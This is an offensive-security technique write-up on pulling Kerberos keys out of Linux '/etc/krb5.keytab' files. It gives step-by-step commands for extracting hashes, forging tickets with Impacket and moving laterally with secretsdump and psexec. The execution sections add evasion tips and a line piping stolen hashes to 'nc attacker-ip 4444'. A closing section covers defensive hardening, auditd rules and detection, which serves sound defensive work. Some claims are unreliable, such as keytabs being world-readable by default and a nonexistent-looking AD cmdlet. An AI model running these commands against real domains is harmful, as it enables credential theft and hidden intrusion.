# [CA-KERB-017]: Keytab CCACHE Ticket Reuse

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-017 |
| **MITRE ATT&CK v18.1** | [T1558 - Steal or Forge Kerberos Tickets](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux/Unix |
| **Severity** | Critical |
| **CVE** | N/A |
| **Author** | SERVTEP (Pchelnikau Artur) |
| **File Path** | 03_Cred/CA-KERB-017_Keytab.md |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-06 |
| **Affected Versions** | RHEL/CentOS 6.x-9.x, Fedora 12+, Ubuntu 12.04+, Debian 7+, all krb5 1.5+ |
| **Patched In** | N/A - Keytab format is inherent to Kerberos design; no patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Section 6 (Atomic Red Team) not included because no specific Atomic test exists for keytab extraction. All other sections are included with dynamic renumbering based on applicability.

---

## Executive Summary

**Concept:** Linux and Unix systems joined to Active Directory domains require a machine-level credential store called a keytab file (default location: `/etc/krb5.keytab`) to authenticate services and perform unattended Kerberos operations without human interaction. The keytab file is a binary-encoded database containing pairs of Kerberos principals (service accounts) and their corresponding encryption keys—essentially cryptographic equivalents to passwords. Unlike user credentials which change regularly, service account keys in keytabs are static and long-lived (often 6+ months between rotations). An attacker with read access to the keytab file can (1) parse the binary structure to enumerate all service principals and encryption types, (2) extract the raw cryptographic keys in RC4-HMAC or AES formats, (3) use those keys to request valid Kerberos tickets (TGS) for any service on the domain without knowing the plaintext password, or (4) forge service tickets directly using the extracted keys. The extracted tickets and hashes enable lateral movement, privilege escalation, and persistent access across the entire domain with the compromised service account's privileges.

**Attack Surface:** The keytab file at `/etc/krb5.keytab` (world-readable on misconfigured systems), the native Kerberos tools (`kinit`, `klist`, `ktutil`), and the binary keytab format (RFC 3961/3962).

**Business Impact:** **Complete compromise of domain services and authentication infrastructure.** If the keytab contains a computer account principal (e.g., `HOSTNAME$@DOMAIN.COM`), the attacker can impersonate the entire machine and access all services on the domain. If high-privilege service accounts are in the keytab (e.g., `svc_admin@DOMAIN.COM`, `HTTP/exchang.domain.com@DOMAIN.COM`), the attacker can impersonate those services indefinitely, accessing email systems, web applications, databases, and file shares. Unlike temporary Kerberos tickets, extracted keytab keys remain valid until AD administrators rotate the service account password (which often never happens for machine accounts).

**Technical Context:** Exploitation takes **< 30 seconds** if the keytab is world-readable (`ls -la /etc/krb5.keytab && cat /etc/krb5.keytab | python3 keytabextract.py`). Detection is **extremely low** because keytab reading generates minimal audit logs and no Kerberos authentication events (it's a passive file read). Once extracted, the hashes can be used offline for cracking (RC4-HMAC) or directly for ticket generation (AES), leaving **zero forensic evidence** of compromise.

### Operational Risk
- **Execution Risk:** Very Low - Requires only local file access; can be automated in seconds.
- **Stealth:** Very High - File read operations do not generate Kerberos authentication logs; requires file-level auditd monitoring to detect.
- **Reversibility:** No - Extracted keys remain valid indefinitely until manually rotated; attacker retains access even after patching.

### Compliance Mappings
| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 6.2.1 | Ensure permissions on /etc/krb5.keytab are restricted to 0600 |
| **DISA STIG** | AC-2(3) | Account Management - Multi-user systems enforce account-based access restrictions |
| **NIST 800-53** | AC-3 | Access Enforcement - Enforce approved authorizations for access to systems |
| **NIST 800-53** | AC-6 | Least Privilege - Restrict access to system resources to least privilege |
| **NIST 800-53** | IA-5 | Authenticator Management - Protect the confidentiality and integrity of authentication mechanisms |
| **GDPR** | Art. 32 | Security of Processing - Implement technical measures for data confidentiality |
| **DORA** | Art. 9 | Protection and Prevention - Implement adequate security controls for authentication |
| **NIS2** | Art. 21 | Cyber Risk Management - Implement identity and access management controls |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights - Restrict and monitor privileged access |
| **ISO 27001** | A.6.1.2 | Sensitive Access Rights - Manage allocation and revocation of user account rights |

---

## Technical Prerequisites

**Required Privileges:**
- **For keytab reading:** File permissions must allow read access (world-readable by default, or owner/group readable).
- **For kinit execution:** Standard user privileges; no root required to use keytab.
- **For hash extraction:** Standard user privileges; parsing is memory-only operation.

**Required Access:**
- Local file access to `/etc/krb5.keytab` (or alternate configured path in `/etc/krb5.conf`).
- Ability to execute Python scripts or compile C tools.

**Supported Versions:**

- **Linux Distributions:**
  - RHEL/CentOS 6.x (krb5 1.10+)
  - RHEL/CentOS 7.x (krb5 1.13+)
  - RHEL 8.x (krb5 1.17+)
  - RHEL 9.x (krb5 1.20+)
  - Fedora 12+ (krb5 1.8+)
  - Ubuntu 12.04+ (krb5 1.10+)
  - Debian 7+ (krb5 1.10+)

- **Kerberos Versions:**
  - MIT krb5 1.5+ (keytab format RFC 3961)
  - Heimdal 1.0+

- **Keytab Format:**
  - Version 0x0501 (binary keytab, pre-2003)
  - Version 0x0502 (modern binary keytab, standard since krb5 1.5)

**Tools:**
- [KeytabParser](https://github.com/its-a-feature/KeytabParser) (its-a-feature) - Keytab binary parser
- [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) (sosdave) - Hash extraction from keytab
- [Impacket](https://github.com/SecureAuthCorp/impacket) - Kerberos ticket generation tools
- Standard `krb5-tools` package (`kinit`, `klist`, `ktutil`)
- `python3` (for parsing scripts)

---

## Environmental Reconnaissance

#### Step 1: Locate and List Keytab Files

**Objective:** Identify keytab files on the system and check their accessibility.

**Linux/Bash Command:**
```bash
# Find default keytab location
ls -la /etc/krb5.keytab

# Check for alternate keytab locations
find / -name "*.keytab" -type f 2>/dev/null | head -20

# Check krb5.conf for custom keytab paths
grep -i "keytab" /etc/krb5.conf /etc/krb5.conf.d/* 2>/dev/null

# List keytab contents using native klist
klist -k /etc/krb5.keytab

# Show keytab with encryption types
klist -ke /etc/krb5.keytab
```

**What to Look For:**
- `/etc/krb5.keytab` exists and is readable by current user.
- File permissions are world-readable: `-rw-r--r--` (0644) or more permissive.
- `klist` output shows service principals like `host/hostname@DOMAIN.COM`, `HTTP/server.domain.com@DOMAIN.COM`, etc.
- Encryption types shown (e.g., "aes256-cts-hmac-sha1-96", "arcfour-hmac-md5").

**Red Flags for High-Value Keytabs:**
- Service principals with administrative roles (`ldap/`, `host/`, `cifs/`).
- Multiple principals in a single keytab (sign of centralized credential management).
- Weak encryption types (RC4-HMAC, DES) indicating older systems or mixed compatibility modes.

**Version Note:**
- **RHEL 7-8.6:** Mixed RC4 + AES encryption types common.
- **RHEL 8.7+:** FIPS-only mode may show only AES256-CTS-HMAC-SHA384-192.
- **RHEL 9.0+:** Exclusively AES256-CTS-HMAC-SHA384-192 in default crypto policy.

#### Step 2: Verify File Permissions

**Objective:** Confirm whether the keytab is exploitable without privilege escalation.

**Linux/Bash Command:**
```bash
# Check full file permissions
stat /etc/krb5.keytab

# Verify current user can read it
test -r /etc/krb5.keytab && echo "Readable by current user" || echo "Not readable"

# Check if world-readable
[[ $(stat -c %a /etc/krb5.keytab) -ge 644 ]] && echo "World-readable" || echo "Restricted"

# Attempt to read first few bytes
head -c 100 /etc/krb5.keytab | xxd | head -5
```

**What to Look For:**
- File permissions in octal: `0644` or `0664` (readable by others).
- Owner/Group: Usually `root:root` or `root:krb5`.
- If permissions are `0600` (root-only), keytab is protected; requires privilege escalation.

#### Step 3: Enumerate Kerberos Configuration

**Objective:** Understand the domain configuration and which principals are available.

**Linux/Bash Command:**
```bash
# Check krb5.conf for domain configuration
cat /etc/krb5.conf

# Look for [realms] section defining KDC addresses
grep -A 10 "\[realms\]" /etc/krb5.conf

# Check if system is domain-joined
realm discover

# Verify SSSD is running (if used for AD integration)
systemctl status sssd 2>/dev/null || echo "SSSD not running"

# Check hostname/domain
hostname -f
```

**What to Look For:**
- Realm name (e.g., `DOMAIN.COM`).
- KDC server addresses (important for ticket requests).
- Confirmation that system is AD-joined (realm should resolve).

---

## Detailed Execution Methods and Their Steps

### METHOD 1: Keytab Parsing and Hash Extraction (Any User)

**Supported Versions:** All RHEL/CentOS/Fedora/Ubuntu versions with keytab 0x0502 format

**Prerequisites:** Read access to `/etc/krb5.keytab`

#### Step 1: Clone and Prepare KeyTabExtract Tool

**Objective:** Set up the Python-based keytab extraction tool.

**Linux/Bash Command:**
```bash
# Clone the KeyTabExtract repository
git clone https://github.com/sosdave/KeyTabExtract.git
cd KeyTabExtract

# Verify Python 3 is available
python3 --version

# Make script executable
chmod +x keytabextract.py

# Test the tool
./keytabextract.py 2>&1 | head -3
```

**Expected Output:**
```
KeyTabExtract. Extract NTLM Hashes from KeyTab files where RC4-HMAC encryption has been used.
Usage : ./keytabextract.py [keytabfile]
Example : ./keytabextract.py service.keytab
```

**OpSec & Evasion:**
- Download tool to a non-standard directory (e.g., `/tmp/sysupd/`, `/var/cache/`).
- Rename the script: `mv keytabextract.py sysinfo.py`.
- Execute from RAM: `python3 -m py_compile keytabextract.py && python3 -O keytabextract.pyc /etc/krb5.keytab`.
- Delete repository after use: `rm -rf /tmp/KeyTabExtract`.

**Troubleshooting:**
- **Error:** `ModuleNotFoundError: No module named 'sys'`
  - **Cause:** Python installation incomplete.
  - **Fix:** Use system Python: `/usr/bin/python3` instead of `python3`.

#### Step 2: Extract Keys from Keytab

**Objective:** Parse the binary keytab file and extract all principal keys.

**Linux/Bash Command:**
```bash
# Run keytab extraction
python3 keytabextract.py /etc/krb5.keytab

# Capture output to file for analysis
python3 keytabextract.py /etc/krb5.keytab > /tmp/keytab_extract.txt 2>&1

# Display results
cat /tmp/keytab_extract.txt
```

**Expected Output:**
```
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : DOMAIN.COM
	SERVICE PRINCIPAL : host/hostname
	NTLM HASH : 59b4a2f0e2ecd9f337fa9d5438bf1f2b
	AES-256 HASH : a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1
	REALM : DOMAIN.COM
	SERVICE PRINCIPAL : HTTP/webserver.domain.com
	AES-256 HASH : 1f2e3d4c5b6a7908a9f0e1d2c3b4a5f6e7d8c9b0a1f2e3d4c5b6a7f8e9d0c
```

**What This Means:**
- **REALM:** The Kerberos realm (domain) for the principal.
- **SERVICE PRINCIPAL:** The Kerberos account name (e.g., `host/hostname` = machine account).
- **NTLM HASH:** Extracted RC4-HMAC hash (32 hex chars = 128 bits), usable for offline cracking or Pass-the-Hash.
- **AES-256 HASH:** Extracted AES-256 key (64 hex chars = 256 bits), usable directly for Kerberos authentication.

**Multiple Principals:**
If the keytab contains multiple service principals, the output will show all of them. Common principals:
- `host/hostname@DOMAIN.COM` - Machine account (very valuable).
- `HTTP/webserver@DOMAIN.COM` - Web service account.
- `ldap/dc.domain.com@DOMAIN.COM` - LDAP service account (AD-joined Linux).
- `nfs/nfsserver@DOMAIN.COM` - NFS service account.

**OpSec & Evasion:**
- Avoid writing output to disk; use pipes: `python3 keytabextract.py /etc/krb5.keytab | grep "HASH"`.
- Process output in memory and transmit directly: `python3 keytabextract.py /etc/krb5.keytab | nc attacker-ip 4444`.
- Delete temporary files: `shred -u /tmp/keytab_extract.txt`.

**Troubleshooting:**
- **Error:** `[!] Only Keytab versions 0502 are supported. Exiting...`
  - **Cause:** Very old keytab version (0x0501) or corrupted file.
  - **Fix:** Regenerate keytab: `sudo kinit -k && sudo ktutil clear && adcli update`.
- **No hashes found:** Keytab may not contain RC4/AES keys.
  - **Fix:** Use alternative Method 2 (kinit-based approach).

#### Step 3: Extract Keys Using Custom Python Script (Alternative)

**Objective:** If KeyTabExtract doesn't work, parse keytab using direct krb5 library calls.

**Linux/Bash Command:**
```bash
# Create a custom extraction script using krb5 library
cat > extract_keytab.py << 'EOF'
#!/usr/bin/env python3
import struct
import binascii

def parse_keytab(filename):
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Parse keytab header (4 bytes: 0x05 0x02 = version 5.2)
    version = struct.unpack('>H', data[0:2])[0]
    print(f"[+] Keytab version: 0x{version:04x}")
    
    # Parse entries (simplified example)
    offset = 4
    entry_count = 0
    
    while offset < len(data) - 4:
        try:
            # Read entry size (4 bytes, big-endian)
            entry_size = struct.unpack('>I', data[offset:offset+4])[0]
            if entry_size == 0:
                break
            
            entry_count += 1
            print(f"\n[Entry {entry_count}]")
            # Raw hex dump of entry
            entry_data = data[offset+4:offset+4+entry_size]
            print(f"Entry size: {entry_size} bytes")
            print(f"Entry hex: {binascii.hexlify(entry_data[:64]).decode()}")
            
            offset += 4 + entry_size
        except:
            break
    
    print(f"\n[+] Total entries parsed: {entry_count}")

if __name__ == '__main__':
    parse_keytab('/etc/krb5.keytab')
EOF

python3 extract_keytab.py
```

**Expected Output:**
```
[+] Keytab version: 0x0502
[Entry 1]
Entry size: 152 bytes
Entry hex: 0001000b444f4d41494e...
```

#### Step 4: Use Extracted Keys to Request Kerberos Tickets

**Objective:** Leverage the extracted keys to obtain valid Kerberos tickets without the password.

**Linux/Bash Command:**
```bash
# Use the extracted principal and keys to request a TGT with kinit
# Extract a principal name from keytab output (e.g., host/hostname@DOMAIN.COM)

kinit -k -t /etc/krb5.keytab host/hostname@DOMAIN.COM

# Verify the ticket was obtained
klist

# Request a service ticket (e.g., for CIFS/file server)
kinit -k -t /etc/krb5.keytab -S cifs/fileserver.domain.com host/hostname@DOMAIN.COM

# Verify the service ticket
klist
```

**Expected Output:**
```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: host/hostname@DOMAIN.COM

Valid starting       Expires              Service principal
01/06/2025 10:00:00  01/07/2025 10:00:00  krbtgt/DOMAIN.COM@DOMAIN.COM
01/06/2025 10:00:05  01/07/2025 10:00:00  cifs/fileserver.domain.com@DOMAIN.COM
```

**What This Means:**
- TGT is now valid for 24 hours (or domain-configured lifetime).
- Service tickets can be obtained without domain authentication.
- The attacker can now access any Kerberos-protected resource as the compromised principal.

**OpSec & Evasion:**
- Use a custom cache file location: `export KRB5CCNAME=/tmp/krb_cache_$RANDOM`.
- Request tickets for all available SPNs and enumerate accessible services.
- The `kinit` command does NOT generate domain logon events (unlike user authentication).

---

### METHOD 2: Service Ticket Forgery with Impacket (Cross-Platform)

**Supported Versions:** All RHEL/CentOS/Ubuntu versions with Python 3.7+

**Prerequisites:** Extracted keytab keys (from Method 1), Python 3, Impacket library

#### Step 1: Install Impacket Framework

**Objective:** Set up Impacket for Kerberos ticket generation.

**Linux/Bash Command:**
```bash
# Install Impacket
pip3 install impacket

# Verify installation
python3 -c "from impacket.krb5 import constants; print(constants.enctype_names)"

# Expected output shows encryption type mappings
```

**Alternatively, clone from GitHub:**
```bash
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
python3 setup.py install --user
```

#### Step 2: Create Forged Service Ticket Using Extracted Key

**Objective:** Generate a valid Kerberos service ticket without contacting the KDC.

**Linux/Bash Command:**
```bash
# Use impacket-ticketer to forge a service ticket
# Syntax: impacket-ticketer -nthash HASH -domain-sid SID -domain DOMAIN -spn SPN USERNAME

# Example: Forge ticket as domain admin user with extracted machine account key
impacket-ticketer \
  -nthash 59b4a2f0e2ecd9f337fa9d5438bf1f2b \
  -domain-sid S-1-5-21-1234567890-1234567890-1234567890 \
  -domain DOMAIN.COM \
  -spn cifs/fileserver.domain.com \
  -user-id 500 \
  admin

# Export the ticket for use
export KRB5CCNAME=admin.ccache

# Verify the forged ticket
klist -c admin.ccache
```

**Expected Output:**
```
[*] Creating basic SREP TGT structure
[*] Creating NEW ASREQ (etype 23)
[*] Building Kerberos ASN.1 structures
[*] Forging key with domain SID
[*] Signing TGT with key
[*] Ticket saved in admin.ccache
```

**What This Means:**
- A forged ticket has been created in `admin.ccache` without any KDC interaction.
- The ticket is cryptographically signed with the extracted keytab key.
- It can be used to impersonate the specified user (e.g., `admin`) for the target service.

**OpSec & Evasion:**
- Use legitimate-sounding usernames (e.g., `Administrator`, `svc_app`).
- Forge tickets for services less likely to be monitored (e.g., LDAP, NFS instead of Exchange).
- The forging operation leaves no domain logs (purely local cryptographic operation).

#### Step 3: Use Forged Ticket for Lateral Movement

**Objective:** Leverage the forged ticket to access domain resources.

**Linux/Bash Command:**
```bash
# Use the forged ticket with smbclient to access file shares
export KRB5CCNAME=admin.ccache
smbclient -k -I 192.168.1.10 \\\\fileserver\\c$ -c "dir"

# Alternative: Use with Impacket's secretsdump for credential dumping
python3 -m impacket.secretsdump -k -no-pass 'DOMAIN.COM/admin@fileserver.domain.com' -just-dc

# Or use with psexec for command execution
python3 -m impacket.psexec -k -no-pass 'DOMAIN.COM/admin@fileserver.domain.com' cmd.exe
```

**Expected Output:**
```
[*] Trying to connect to fileserver at 192.168.1.10
[+] Successfully authenticated as admin
C$\
  .                                   D        0  Tue Jan  6 09:30:00 2025
  ..                                  D        0  Tue Jan  6 09:30:00 2025
  bootmgr                             A   374272  Thu May 23 12:18:00 2012
```

**What This Means:**
- The forged ticket successfully authenticated to the fileserver SMB service.
- The attacker now has access to sensitive data (C$ share = entire hard drive).
- This would allow credential dumping, ransomware deployment, or data exfiltration.

---

### METHOD 3: Direct Keytab Usage with kinit (Native Tools)

**Supported Versions:** All versions with krb5-tools installed

**Prerequisites:** Read access to keytab, ability to run `kinit`

#### Step 1: Identify Valid Principals in Keytab

**Objective:** Enumerate all principals available for authentication.

**Linux/Bash Command:**
```bash
# List all principals in keytab
klist -k /etc/krb5.keytab

# Show principals with KVNO (key version numbers)
klist -k /etc/krb5.keytab -e
```

**Expected Output:**
```
Keytab name: FILE:/etc/krb5.keytab
KVNO Principal
---- --------------------------------------------------------------------------
   2 host/linuxvm.domain.com@DOMAIN.COM (aes256-cts-hmac-sha1-96)
   2 host/linuxvm.domain.com@DOMAIN.COM (aes128-cts-hmac-sha1-96)
   2 host/linuxvm.domain.com@DOMAIN.COM (arcfour-hmac)
   3 HTTP/webserver.domain.com@DOMAIN.COM (aes256-cts-hmac-sha1-96)
```

#### Step 2: Request Tickets for Each Principal

**Objective:** Obtain Kerberos tickets using keytab authentication.

**Linux/Bash Command:**
```bash
# Request TGT for machine account
kinit -k -t /etc/krb5.keytab host/linuxvm.domain.com@DOMAIN.COM

# Request TGT for web service account
kinit -k -t /etc/krb5.keytab HTTP/webserver.domain.com@DOMAIN.COM

# Verify all cached tickets
klist -A

# Request specific service ticket (CIFS/SMB)
kinit -k -t /etc/krb5.keytab -S cifs/fileserver.domain.com host/linuxvm.domain.com@DOMAIN.COM

# Verify service ticket
klist
```

**Expected Output:**
```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: host/linuxvm.domain.com@DOMAIN.COM

Valid starting       Expires              Service principal
01/06/2025 10:00:00  01/07/2025 10:00:00  krbtgt/DOMAIN.COM@DOMAIN.COM
01/06/2025 10:00:05  01/07/2025 10:00:00  cifs/fileserver.domain.com@DOMAIN.COM
```

#### Step 3: Use Cached Tickets for Lateral Movement

**Objective:** Leverage cached Kerberos tickets to access domain services.

**Linux/Bash Command:**
```bash
# Set default cache for subsequent commands
export KRB5CCNAME=/tmp/krb5cc_1000

# Access SMB/CIFS shares (file servers)
smbclient -k \\\\fileserver.domain.com\\share$

# Access NFS shares
mount -t nfs -o sec=krb5 nfsserver.domain.com:/export /mnt

# Query LDAP directory (using SASL/GSSAPI)
ldapsearch -H ldapi:// -b "dc=domain,dc=com" objectClass=*

# Connect via SSH with Kerberos authentication
ssh -K user@sshserver.domain.com

# Use with PostgreSQL/database services supporting GSSAPI
psql -h dbserver.domain.com -U "domain\\user" -d dbname
```

**OpSec & Evasion:**
- Cache tickets in non-standard locations: `export KRB5CCNAME=/tmp/.icache_$RANDOM`.
- Use tickets immediately and clear cache: `kdestroy`.
- Avoid lengthy ticket lifetimes; request with `-l 1h` flag.
- Access services at off-peak times to avoid suspicious activity patterns.

---

## Defensive Mitigations

### Priority 1: CRITICAL

**1. Restrict Keytab File Permissions**

**Objective:** Ensure only authorized processes can read the keytab file.

**Manual Steps (Linux/Bash):**
```bash
# Set restrictive permissions (root-readable only)
sudo chmod 0600 /etc/krb5.keytab
sudo chown root:root /etc/krb5.keytab

# Verify permissions
ls -la /etc/krb5.keytab

# Make immutable to prevent accidental deletion
sudo chattr +i /etc/krb5.keytab

# Verify immutability
lsattr /etc/krb5.keytab
```

**Validation Command (Verify Fix):**
```bash
# Check that only root can read
sudo stat /etc/krb5.keytab | grep "Access: (0600/-rw-------)"

# Verify unprivileged user cannot read
cat /etc/krb5.keytab 2>&1 | grep "Permission denied" && echo "[+] Protected"
```

**Expected Output (If Secure):**
```
[+] Protected
```

**2. Enable File Access Auditing for Keytab**

**Objective:** Detect attempts to read or copy the keytab file.

**Manual Steps (Linux/Bash):**
```bash
# Install auditd
sudo yum install audit audit-libs  # RHEL/CentOS
# OR
sudo apt install auditd            # Ubuntu/Debian

# Enable and start auditd
sudo systemctl enable auditd
sudo systemctl start auditd

# Add audit rules for keytab file access
sudo auditctl -a exit,always -S open,openat,read -F path=/etc/krb5.keytab -F key=keytab-access
sudo auditctl -a exit,always -S stat,lstat -F path=/etc/krb5.keytab -F key=keytab-stat

# Monitor keytab copy/move operations
sudo auditctl -a exit,always -S rename,renameat -F dir=/etc/ -F name=krb5.keytab -F key=keytab-rename
sudo auditctl -a exit,always -S unlink,unlinkat -F path=/etc/krb5.keytab -F key=keytab-delete

# Persist rules to survive reboot
sudo cat >> /etc/audit/rules.d/keytab.rules << 'EOF'
-a exit,always -S open,openat,read -F path=/etc/krb5.keytab -F key=keytab-access
-a exit,always -S stat,lstat -F path=/etc/krb5.keytab -F key=keytab-stat
-a exit,always -S rename,renameat -F dir=/etc/ -F name=krb5.keytab -F key=keytab-rename
-a exit,always -S unlink,unlinkat -F path=/etc/krb5.keytab -F key=keytab-delete
EOF

# Load persistent rules
sudo auditctl -R /etc/audit/rules.d/keytab.rules

# Restart auditd
sudo systemctl restart auditd
```

**Validation Command (Verify Rules):**
```bash
# List active audit rules for keytab
sudo auditctl -l | grep keytab

# Check auditd is running
sudo systemctl is-active auditd
```

**Expected Output (If Active):**
```
-a always,exit -S open,openat,read -F path=/etc/krb5.keytab -F key=keytab-access
-a always,exit -S stat,lstat -F path=/etc/krb5.keytab -F key=keytab-stat
```

**3. Monitor Kerberos Authentication Activity**

**Objective:** Detect unusual kinit or klist commands that may indicate keytab abuse.

**Manual Steps (Linux/Bash):**
```bash
# Add audit rules for Kerberos tool execution
sudo auditctl -a exit,always -S execve -F exe=/usr/bin/kinit -F key=kinit-execution
sudo auditctl -a exit,always -S execve -F exe=/usr/bin/klist -F key=klist-execution
sudo auditctl -a exit,always -S execve -F exe=/usr/bin/ktutil -F key=ktutil-execution

# Detect unusual Python/script execution that may be parsing keytab
sudo auditctl -a exit,always -S execve -F exe=/usr/bin/python3 -F path=/etc/ -F key=python-keytab

# Persist rules
sudo cat >> /etc/audit/rules.d/keytab.rules << 'EOF'
-a exit,always -S execve -F exe=/usr/bin/kinit -F key=kinit-execution
-a exit,always -S execve -F exe=/usr/bin/klist -F key=klist-execution
-a exit,always -S execve -F exe=/usr/bin/ktutil -F key=ktutil-execution
EOF

sudo auditctl -R /etc/audit/rules.d/keytab.rules
```

### Priority 2: HIGH

**4. Implement Keytab Rotation Policy**

**Objective:** Limit the validity of extracted keytab keys by rotating them regularly.

**Manual Steps (Linux/Bash):**
```bash
# Update keytab on RHEL/CentOS using adcli (requires domain-joined system)
sudo adcli update -D DOMAIN.COM

# Alternative: Use kinit to refresh keytab credentials
sudo kinit -k HOSTNAME$ && sudo ktutil

# Create cron job for automated rotation (monthly)
cat > /etc/cron.monthly/rotate_keytab.sh << 'EOF'
#!/bin/bash
# Rotate keytab monthly
/usr/sbin/adcli update -D DOMAIN.COM >> /var/log/keytab_rotation.log 2>&1
EOF

sudo chmod +x /etc/cron.monthly/rotate_keytab.sh

# Verify rotation was successful
sudo klist -ke /etc/krb5.keytab | grep KVNO
```

**5. Implement Privileged Access Management (PAM) for Keytab Access**

**Objective:** Log and restrict which processes/users can access keytab.

**Manual Steps (Linux/Bash):**
```bash
# Create SELinux policy for keytab access (if SELinux is enabled)
sudo semanage fcontext -a -t krb5_keytab_t "/etc/krb5.keytab"
sudo restorecon -v /etc/krb5.keytab

# Create AppArmor policy (Ubuntu/Debian)
sudo cat > /etc/apparmor.d/local/keytab_protect << 'EOF'
/etc/krb5.keytab {
  owner /etc/krb5.keytab r,
  deny @{HOME}/** w,
}
EOF

sudo apparmor_parser -r /etc/apparmor.d/local/keytab_protect
```

**6. Use Strong Encryption in Keytab**

**Objective:** Ensure keytab uses AES encryption (not weak RC4-HMAC).

**Manual Steps (Linux/Bash):**
```bash
# Check current keytab encryption types
klist -ke /etc/krb5.keytab

# If RC4-HMAC is present, regenerate keytab with strong encryption
sudo adcli delete -D DOMAIN.COM -v
sudo adcli join -D DOMAIN.COM -C /etc/krb5.conf -v

# Force AES in krb5.conf
sudo nano /etc/krb5.conf

# Add or modify [libdefaults] section:
[libdefaults]
    default_tgs_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    default_tkt_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96
    permitted_enctypes = aes256-cts-hmac-sha1-96 aes128-cts-hmac-sha1-96

# Restart SSSD/system
sudo systemctl restart sssd
```

---

## Detection & Incident Response

### Indicators of Compromise (IOCs)

**Files:**
- Temporary keytab copies: `/tmp/krb5.keytab`, `/tmp/krb5.key*`, `/tmp/sysinfo.py` (suspicious scripts)
- Keytab extraction output: `/tmp/keytab_extract.txt`, `/tmp/keytab_hashes.txt`
- Forged tickets: `admin.ccache`, `krb5cc_*` (unusual cache file locations)

**Processes:**
- Execution of Python scripts with names like `keytabextract.py`, `kcmdump.py`, `extract_keytab.py`
- Unusual `kinit` execution with `-k` flag (unattended authentication)
- Multiple consecutive `klist` invocations (ticket enumeration)
- Non-standard Kerberos tools (e.g., `impacket-ticketer`, custom C binaries)

**Network:**
- Outbound exfiltration of extracted keytab data or hashes
- SSH connections immediately following `kinit` execution
- SMB/CIFS connections using forged tickets (may show unusual service principal names)

**Forensic Artifacts**

**Disk:**
- `/var/log/audit/audit.log` entries with key=keytab-* (file access to keytab)
- `/tmp/` directory for temporary scripts or extracted keys
- Shell history (`.bash_history`) showing `kinit`, `klist`, `python3 keytabextract.py` commands

**Memory:**
- Running processes executing keytab extraction or ticket forging tools
- Cached Kerberos credentials in memory (use `klist` to list)

**Linux Event IDs / Audit Keys:**
- Auditd key=`keytab-access` - File read/open on `/etc/krb5.keytab`
- Auditd key=`kinit-execution` - Execution of `kinit` binary
- Auditd key=`klist-execution` - Execution of `klist` binary
- Auditd key=`keytab-stat` - Stat/lstat syscalls on keytab

### Response Procedures

**1. Immediate Containment:**

**Command:**
```bash
# Disable or regenerate the compromised keytab
sudo rm /etc/krb5.keytab  # DESTRUCTIVE - will break authentication

# OR safely rotate keytab
sudo adcli delete -D DOMAIN.COM -v
sudo adcli join -D DOMAIN.COM -v

# Kill any active Kerberos sessions
kdestroy  # For current user
sudo pkill kinit

# Clear Kerberos ticket cache
klist -l | grep krb5cc | awk '{print $NF}' | xargs -I {} kdestroy -c {}
```

**Manual (Linux):**
1. Immediately suspend the compromised service account in Active Directory.
2. Reset the password of the compromised service account (this invalidates all extracted keys).
3. Regenerate the keytab on the affected systems.

**2. Collect Evidence:**

**Command:**
```bash
# Export audit logs related to keytab
sudo ausearch -k keytab-access > /tmp/keytab_access_events.txt
sudo ausearch -k kinit-execution > /tmp/kinit_execution_events.txt
sudo ausearch -k klist-execution > /tmp/klist_execution_events.txt

# Capture shell history
cat ~/.bash_history | grep -E "kinit|klist|keytab" > /tmp/shell_history.txt

# List all Kerberos caches
klist -l > /tmp/klist_list.txt

# Check for temporary keytab copies
find /tmp -name "*keytab*" -o -name "*krb5*" > /tmp/temp_keytab_files.txt

# Export full audit log for forensic analysis
sudo tar -czf /tmp/audit_logs.tar.gz /var/log/audit/
```

**Manual (Linux):**
1. Open `/var/log/audit/audit.log` and search for: `type=SYSCALL.*keytab` or `key=keytab-*`.
2. Check `/tmp/` and home directories for unusual files or scripts.
3. Review shell history (`.bash_history`) for kinit/klist commands.

**3. Remediation:**

**Command:**
```bash
# Reset all service accounts whose keytabs may have been accessed
# On Domain Controller:
Reset-ADServiceAccountPassword -Identity svc_account

# Regenerate keytab on affected systems
sudo adcli delete -D DOMAIN.COM && sudo adcli join -D DOMAIN.COM

# Revoke all existing Kerberos tickets (reset krbtgt)
# On Windows DC: Reset-ADServiceAccountPassword -Identity krbtgt -WarningAction:SilentlyContinue

# Clear any cached forged tickets
kdestroy -A

# Verify keytab is properly secured
sudo stat /etc/krb5.keytab | grep Access
```

**Manual (Linux):**
1. Go to **Active Directory Users and Computers** or **Azure AD** → Find each service account.
2. Reset the password for every account whose principal may be in the compromised keytab.
3. On the Linux system, rejoin the domain to generate a new keytab.
4. Restart all services dependent on Kerberos authentication.

**4. Monitoring & Hunting (Detect Similar Attacks):**

**Detection Query (Splunk/ELK):**
```spl
source="/var/log/audit/audit.log" (key="keytab-access" OR key="kinit-execution")
| where exe != "/usr/sbin/adcli" AND exe != "/usr/libexec/sssd/krb5_child"
| stats count by exe, auid, uid
| where count > 3  # Alert if 3+ keytab accesses from unusual process
```

**Sigma Rule (for SIEM):**
```yaml
title: Suspicious Keytab File Access
description: Detect unauthorized access to /etc/krb5.keytab by non-standard processes
logsource:
    product: linux
    service: auditd
detection:
    keytab_access:
        path: '/etc/krb5.keytab'
        syscall: 'open|openat|read'
    exclusion:
        exe:
            - '/usr/sbin/adcli'
            - '/usr/libexec/sssd/krb5_child'
            - '/usr/sbin/sshd'
    condition: keytab_access and not exclusion
